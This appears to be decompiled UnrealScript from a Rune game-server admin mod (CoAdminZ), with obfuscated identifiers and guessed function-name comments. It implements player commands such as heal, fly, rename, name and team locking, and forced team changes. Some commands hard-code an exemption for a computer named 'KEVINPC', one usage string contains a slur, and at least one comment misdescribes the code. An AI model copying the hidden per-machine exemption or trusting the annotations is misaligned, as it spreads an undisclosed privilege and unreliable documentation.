			targetPawn.GotoState('eq_vxv_479');
			PlayerPawn(targetPawn).ClientMessage(actionUpper $ " turned you into a spider");
			eq_vxv_157(AdminPawn, targetName $ " -> SPIDER ON");
		}
		else if (targetPawn.IsInState('eq_vxv_479'))
		{
			targetPawn.GotoState('PlayerWalking');
			PlayerPawn(targetPawn).ClientMessage(actionUpper $ " broke 6 of your legs.");
			eq_vxv_157(AdminPawn, targetName $ " -> SPIDER OFF");
		}
	}

	// Heal target to full health
	if (actionUpper == "HEAL")
	{
		targetPawn.Health = targetPawn.MaxHealth;
		PlayerPawn(targetPawn).ClientMessage(actionUpper $ " gave you full health.");
		eq_vxv_157(AdminPawn, targetName $ " -> HEALED");
	}

	// Refill rune power
	if (actionUpper == "POWER")
	{
		targetPawn.RunePower = targetPawn.MaxPower;
		PlayerPawn(targetPawn).ClientMessage(actionUpper $ " turned you into a real SONGOKU");
		eq_vxv_157(AdminPawn, targetName $ " -> FULL POWER");
	}

	// Force target into flying cheat state
	if (actionUpper == "FLY")
	{
		targetPawn.GotoState('CheatFlying');
		PlayerPawn(targetPawn).ClientMessage(actionUpper $ " forced you to fly.");
		eq_vxv_157(AdminPawn, targetName $ " -> FLY");
	}

	// Toggle fatness (DesiredFatness byte)
	if (actionUpper == "FAT")
	{
		if (int(targetPawn.DesiredFatness) == 255)
		{
			targetPawn.DesiredFatness = 128;
			PlayerPawn(targetPawn).ClientMessage(actionUpper $ " sent you to a Weight Watchers course.");
			eq_vxv_157(AdminPawn, targetName $ " -> FAT off");
		}
		else
		{
			targetPawn.DesiredFatness = byte(255);
			PlayerPawn(targetPawn).ClientMessage(actionUpper $ " turned you into a fatty.");
			eq_vxv_157(AdminPawn, targetName $ " -> FAT on");
		}
	}

	// Return target to walking state
	if (actionUpper == "WALK")
	{
		PlayerPawn(targetPawn).StartWalk();
		PlayerPawn(targetPawn).ClientMessage("You're now back on earth.");
		eq_vxv_157(AdminPawn, targetName $ " -> WALK");
	}

	// Respawn the target pawn
	if (actionUpper == "RESPAWN")
	{
		ZRunePlayer(targetPawn).SetConsoleGBool();
		PlayerPawn(targetPawn).ServerReStartPlayer();
		PlayerPawn(targetPawn).ClientMessage(actionUpper $ " resuscitated you.");
		eq_vxv_157(AdminPawn, targetName $ " -> RESPAWN");
	}

	// Increase network speed for target
	if (actionUpper == "NETSPEED")
	{
		ZRunePlayer(targetPawn).SetNetSpeedInRange(50000000);
		eq_vxv_157(AdminPawn, targetName $ " -> NETSPEED 50000000");
	}

	return;
}
// Suggested function name: AdminChangePlayerName
function PName(string CommandArgs, PlayerPawn AdminPlayer)
{
	local string KevinPC; // Special admin computer name constant
	local Pawn TargetPawn; // The pawn of the player whose name is being changed
	local int SpaceIndex; // Position of the first space in the command
	local int CommandLength; // Total length of the command string
	local int TargetID; // Player ID extracted from the command
	local string NewName; // The new name to assign to the player
	local string OldName; // The player's current name for messaging
	local string AdminName; // The admin's name for messaging

	// Define the special computer name for restricted access
	KevinPC = "'KEVINPC'";

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pName", AdminPlayer))
	{
		return;
	}

	// If no command arguments provided, do nothing
	if (CommandArgs == "")
	{
		return;
	}

	// Parse the command: find the space separating ID and new name
	SpaceIndex = InStr(CommandArgs, " ");
	CommandLength = Len(CommandArgs);
	TargetID = int(Left(CommandArgs, SpaceIndex));
	NewName = Right(CommandArgs, (CommandLength - SpaceIndex) - 1);

	// Find the target pawn by player ID
	TargetPawn = GetPawnByPlayerID(TargetID);

	// If no new name provided, show usage instructions
	if (NewName == "")
	{
		AdminPlayer.ClientMessage("You did not use it as supposed to be used.");
		AdminPlayer.ClientMessage("Usage: pName ID new name / pname 0 cunt");
		return;
	}

	// Validate the target pawn and ensure the admin isn't targeting themselves or a restricted computer
	if ((((TargetPawn != none) && (TargetPawn.PlayerReplicationInfo != none) && (TargetPawn.PlayerReplicationInfo.PlayerID == TargetID)) && (AdminPlayer.PlayerReplicationInfo.PlayerID != TargetID)) && (zPlayerReplicationInfo(PlayerPawn(TargetPawn).PlayerReplicationInfo).CompName != KevinPC))
	{
		// Store names for messaging
		OldName = TargetPawn.PlayerReplicationInfo.PlayerName;
		AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;

		// Add possessive suffix to the old name for the message
		if (Right(OldName, 1) ~= "s")
		{
			OldName = OldName $ "'";
		}
		else
		{
			OldName = OldName $ "'s";
		}

		// Change the player's name, limiting to 48 characters
		TargetPawn.PlayerReplicationInfo.PlayerName = Left(NewName, 48);

		// If the player's name is locked, update the locked name as well
		if (zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).B_v5350)
		{
			zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).STR_v5353 = Left(NewName, 48);
		}

		// Broadcast the name change to all players
		BroadcastMessage(((((AdminName $ " changed ") $ OldName) $ " name into '") $ Left(NewName, 48)) $ "'", false, 'CAZ');
	}

	return;
}
// Suggested function name: TogglePlayerNameLock
function pNameLock(string CommandArgs, PlayerPawn AdminPlayer)
{
	local string KevinPC; // Special admin computer name constant for restricted access
	local Pawn TargetPawn; // The pawn of the player whose name lock is being toggled
	local int SpaceIndex; // Position of the first space in the command string
	local int CommandLength; // Total length of the command string
	local int TargetID; // Player ID extracted from the command
	local string AdminName; // The admin's name for messaging
	local string TargetName; // The target's name for messaging

	// Define the special computer name for restricted access
	KevinPC = "'KEVINPC'";

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pNameLock", AdminPlayer))
	{
		return;
	}

	// If no command arguments provided, do nothing
	if (CommandArgs == "")
	{
		return;
	}

	// Parse the command: find the space separating ID from the rest (though rest is unused here)
	SpaceIndex = InStr(CommandArgs, " ");
	CommandLength = Len(CommandArgs);
	TargetID = int(Left(CommandArgs, SpaceIndex));

	// Find the target pawn by player ID
	TargetPawn = GetPawnByPlayerID(TargetID);

	// Validate the target pawn and ensure the admin isn't targeting themselves or a restricted computer
	if ((((TargetPawn != none) && (TargetPawn.PlayerReplicationInfo != none) && (TargetPawn.PlayerReplicationInfo.PlayerID == TargetID)) && (AdminPlayer.PlayerReplicationInfo.PlayerID != TargetID)) && (zPlayerReplicationInfo(PlayerPawn(TargetPawn).PlayerReplicationInfo).CompName != KevinPC))
	{
		// Store names for messaging
		TargetName = TargetPawn.PlayerReplicationInfo.PlayerName;
		AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;

		// Add possessive suffix to the target name for the message
		if (Right(TargetName, 1) ~= "s")
		{
			TargetName = TargetName $ "'";
		}
		else
		{
			TargetName = TargetName $ "'s";
		}

		// Toggle the name lock flag
		if (zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).B_v5350)
		{
			// Unlock the name
			zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).B_v5350 = false;
			BroadcastMessage(((AdminName $ " has unlocked ") $ TargetName) $ " name.", false, 'CAZ');
		}
		else
		{
			// Lock the name
			zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).B_v5350 = true;
			zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).STR_v5353 = TargetPawn.PlayerReplicationInfo.PlayerName;
			BroadcastMessage(((AdminName $ " has locked ") $ TargetName) $ " name.", false, 'CAZ');
		}
	}

	return;
}
// Suggested function name: TogglePlayerTeamLock
function pTeamLock(string CommandArgs, PlayerPawn AdminPlayer)
{
	local string KevinPC; // Special admin computer name constant for restricted access
	local Pawn TargetPawn; // The pawn of the player whose team lock is being toggled
	local int SpaceIndex; // Position of the first space in the command string
	local int CommandLength; // Total length of the command string
	local int TargetID; // Player ID extracted from the command
	local string AdminName; // The admin's name for messaging
	local string TargetName; // The target's name for messaging

	// Define the special computer name for restricted access
	KevinPC = "'KEVINPC'";

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pTeamLock", AdminPlayer))
	{
		return;
	}

	// Ensure this is a team game, not deathmatch
	if (Level.Game.Class == Class'coadminz7.RuneMultiPlayer')
	{
		AdminPlayer.ClientMessage("Can't be used at Deathmatch");
		return;
	}

	// If no command arguments provided, do nothing
	if (CommandArgs == "")
	{
		return;
	}

	// Parse the command: find the space separating ID from the rest (though rest is unused here)
	SpaceIndex = InStr(CommandArgs, " ");
	CommandLength = Len(CommandArgs);
	TargetID = int(Left(CommandArgs, SpaceIndex));

	// Find the target pawn by player ID
	TargetPawn = GetPawnByPlayerID(TargetID);

	// Validate the target pawn and ensure the admin isn't targeting themselves or a restricted computer
	if ((((TargetPawn != none) && (TargetPawn.PlayerReplicationInfo != none) && (TargetPawn.PlayerReplicationInfo.PlayerID == TargetID)) && (AdminPlayer.PlayerReplicationInfo.PlayerID != TargetID)) && (zPlayerReplicationInfo(PlayerPawn(TargetPawn).PlayerReplicationInfo).CompName != KevinPC))
	{
		// Store names for messaging
		TargetName = TargetPawn.PlayerReplicationInfo.PlayerName;
		AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;

		// Add possessive suffix to the target name for the message
		if (Right(TargetName, 1) ~= "s")
		{
			TargetName = TargetName $ "'";
		}
		else
		{
			TargetName = TargetName $ "'s";
		}

		// Toggle the team lock flag
		if (zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).B_v5351)
		{
			// Unlock the team
			zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).B_v5351 = false;
			BroadcastMessage(((AdminName $ " has unlocked ") $ TargetName) $ " team.", false, 'CAZ');
		}
		else
		{
			// Lock the team
			zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).B_v5351 = true;
			zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).INT_v5352 = int(TargetPawn.PlayerReplicationInfo.Team);
			BroadcastMessage(((AdminName $ " has locked ") $ TargetName) $ " team.", false, 'CAZ');
		}
	}

	return;
}
// Suggested function name: NotifyPlayerAndLog
function eq_vxv_157(PlayerPawn AdminPlayer, string Message)
{
	local string PlayerName;

	// Retrieve the admin player's name for logging
	PlayerName = AdminPlayer.PlayerReplicationInfo.PlayerName;

	// Send the message to the admin player
	AdminPlayer.ClientMessage(Message);

	// Log the event with the admin's name and message
	LogCoAdminZEvent((("[CoAdminZ:] " $ PlayerName) $ " -> ") $ Message);
	return;
}

// Suggested function name: TogglePinkTeamJoinProtection
function pPink(PlayerPawn AdminPlayer)
{
	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pPink", AdminPlayer))
	{
		return;
	}

	// Toggle the pink team join protection flag
	B_v5796 = !B_v5796;

	// Broadcast the appropriate message based on the new state
	if (B_v5796)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " enabled the join protection for team pink.", false, 'CAZ');
	}
	else
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " disabled the join protection for team pink.", false, 'CAZ');
	}

	// Save the configuration changes
	SaveConfig();
	return;
}
// Suggested function name: ToggleAutoPickup
function pAutoPickup(PlayerPawn AdminPlayer)
{
	// Check if the admin has permission to use this command (note: permission check uses "pPink", might be a copy-paste error)
	if (!HasCommandPermission("pAutoPickup", AdminPlayer))
	{
		return;
	}

	// Toggle the auto-pickup setting for the game
	Level.Game.bAutoPickup = !Level.Game.bAutoPickup;

	// Broadcast the appropriate message based on the new state
	if (Level.Game.bAutoPickup)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " enabled auto-pickup.", false, 'CAZ');
	}
	else
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " disabled auto-pickup.", false, 'CAZ');
	}

	// Save the configuration changes
	SaveConfig();
	return;
}
// Suggested function name: AdminChangePlayerTeam
function pTeam(string CommandArgs, PlayerPawn AdminPlayer)
{
	local string TeamName; // The team name extracted from command args (e.g., "RED", "BLUE")
	local Pawn TargetPawn; // The pawn of the target player
	local int SpaceIndex; // Position of the space separating ID and team name in CommandArgs
	local int ArgsLength; // Total length of CommandArgs
	local int TargetID; // Player ID extracted from CommandArgs
	local int TeamColor; // Numeric value of the team color (0=Red, 1=Blue, etc.)
	local string AdminName; // Name of the admin player
	local string TargetName; // Name of the target player
	local bool IsValidTeam; // Flag indicating if the specified team is valid

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pTeam", AdminPlayer))
	{
		return;
	}

	// If no command arguments provided, do nothing
	if (CommandArgs == "")
	{
		return;
	}

	// Ensure this is a team game
	if (!Level.Game.bTeamGame)
	{
		AdminPlayer.ClientMessage("This is not a team game...", 'Subtitle');
		return;
	}

	// Parse the command: find the space separating ID and team name
	SpaceIndex = InStr(CommandArgs, " ");
	ArgsLength = Len(CommandArgs);
	TargetID = int(Left(CommandArgs, SpaceIndex));
	TeamName = Caps(Right(CommandArgs, (ArgsLength - SpaceIndex) - 1));
	IsValidTeam = true;

	// Determine the team color based on the team name
	switch (TeamName)
	{
		case "RED":
			TeamColor = 0;
			break;
		case "BLUE":
			TeamColor = 1;
			break;
		case "GREEN":
			TeamColor = 2;
			break;
		case "GOLD":
			TeamColor = 3;
			break;
		case "PINK":
			TeamColor = 4;
			break;
		case "PURPLE":
			TeamColor = 4; // Purple maps to Pink
			break;
		default:
			AdminPlayer.ClientMessage("You used an incorrect team.", 'Subtitle');
			return;
			break;
	}

	// Find the target pawn by player ID
	TargetPawn = GetPawnByPlayerID(TargetID);
	if ((TargetPawn != none) && (TargetPawn.PlayerReplicationInfo != none))
	{
		// Verify the player ID matches
		if (TargetPawn.PlayerReplicationInfo.PlayerID == TargetID)
		{
			// Mark the player as having been team-changed by admin
			zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).B_v5347 = true;

			// Temporarily disable pink team protection if assigning to pink
			if (IsValidTeam && TeamColor == 4)
			{
				B_v5796 = false;
			}

			// Change the player's team
			Teamgame(Level.Game).ChangeTeam(TargetPawn, TeamColor);

			// Re-enable pink team protection
			if (IsValidTeam)
			{
				B_v5796 = true;
			}

			// Prepare names for broadcast message
			TargetName = TargetPawn.PlayerReplicationInfo.PlayerName;
			AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;

			// Update the player's team visualization if applicable
			if (ZRunePlayer(TargetPawn) != none)
			{
				ZRunePlayer(TargetPawn).eq_vxv_545(TeamColor);
			}

			// If the player's team is locked, update the locked team value
			if (zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).B_v5351)
			{
				zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).INT_v5352 = TeamColor;
			}

			// Broadcast the team change to all players
			BroadcastMessage((AdminName $ " forced a teamchange to ") $ TargetName, false, 'CAZ');
		}
	}

	return;
}
// Suggested function name: AssignPlayerToTeamWithSkin
function AssignPlayerToTeamWithSkin(int PlayerID, int TeamColor, string SkinClass, optional bool SkipTeamChange)
{
	local Pawn TargetPawn;

	// Retrieve the pawn for the specified player ID
	TargetPawn = GetPawnByPlayerID(PlayerID);
	if ((TargetPawn != none) && TargetPawn.PlayerReplicationInfo != none)
	{
		// Verify the player ID matches to ensure we're targeting the correct player
		if (TargetPawn.PlayerReplicationInfo.PlayerID == PlayerID)
		{
			// Mark the player as having been team-changed by admin
			zPlayerReplicationInfo(PlayerPawn(TargetPawn).PlayerReplicationInfo).B_v5347 = true;
			if (!SkipTeamChange)
			{
				// Change the player's team if not skipping
				Teamgame(Level.Game).ChangeTeam(TargetPawn, TeamColor);
			}
			// Set the game password on the player (likely for client-side handling)
			ZRunePlayer(TargetPawn).eqdot_vxv_1463(ConsoleCommand("get Engine.GameInfo GamePassword"));
			// Update the player's team visualization
			ZRunePlayer(TargetPawn).eq_vxv_545(TeamColor);
			if (SkinClass != "")
			{
				// Apply the specified skin class if provided
				ZRunePlayer(TargetPawn).eqdot_vxv_1464(SkinClass);
			}
			// Notify the player of the game password
			ZRunePlayer(TargetPawn).ClientMessage(("!!! GAMEPASSWORD = " $ (ConsoleCommand("get Engine.GameInfo GamePassword"))) $ " !!!", 'CAZ');
		}
	}
	return;
}

function pSoundsON(PlayerPawn PP)
{
    if(!HasCommandPermission("pSoundsOn", PP))
    {
        return;
    }
    Sounds = true;
    PP.ClientMessage("UT Sounds are enabled");
    return;
}

function pSoundsOFF(PlayerPawn PP)
{
    if(!HasCommandPermission("pSoundsOff", PP))
    {
        return;
    }
    Sounds = false;
    PP.ClientMessage("UT Sounds are disabled, write pSoundsOn for special UT feeling");
    return;
}

defaultproperties
{
    allowedEFiles(0)="3a5b39ffe58be2bfa33ac445ae6a4b88"
    allowedEFiles(1)="e0818eff069ebc7aaa8c5033e266268c"
    allowedEFiles(2)="49c26a4814d57fcc169e598111e5f637"
    allowedEFiles(3)="bc8db45693fb2aefa3d64de4c48c383f"
    allowedEFiles(4)="3bf8cb5a67039d82fa1ad8e5b8f072ea"
    allowedEFiles(5)="b812bb67ac69de6cdfa818f72b5bbb7c"
    protectedTeam=-1
    bDisableRunes=true
    bHealthbars=true
    IpTempBanned="Your IP has been banned for the duration of this map."
    strMuted="You have been muted, you spam only for yourself now"
    strMute="%player has been muted by %admin."
    strUnmute="%player has been unmuted by %admin."
    AntiSpeedhack="0"
    bDisableUnderWaterBlood=true
    bShowPasswordPrefix=true
    MOTDGapSize=2
    allowedRejoinCount=8
    moreMOTD="Commands "
    SeperatorColor=(R=255,G=255,B=255,A=0)
    ServerNameColor=(R=0,G=255,B=0,A=0)
    HeaderColor=(R=0,G=255,B=0,A=0)
    HeadingsColor=(R=255,G=255,B=0,A=0)
    announcerServerFullMsg="%s tried to join but the server is full :("
    announcerConnectingMsg="%s is currently connecting. (downloading/waiting)"
    announcerOtherMsg="%s tried to join but the server didn't like him. Reason:"
    ReasonServerChange="went to another server"
    ReasonExit="closed the game"
    ReasonReconnect="reconnecting"
    ReasonDisconnect="disconnected"
    ReasonKick="kicked"
    ReasonBan="banned"
    ReasonMapBan="banned for the current map"
    ReasonMapChange="server changed map"
    ReasonLocked="caught cheating"
    ReasonRelaunch="relaunching"
    ReasonTimeOutError="timeout/error"
    ReasonDemoPlay="watching a demo-recorded game"
    ReasonVideoDriver="changing video driver"
    damageStats=true
    bswitchcolors=true
    bshowshadow=true
    bArenaSounds=true
    announceConnect=true
    nextMapMode=2
    RequiemCameraFix=3
    packagecheck=99
    packagemode=2
}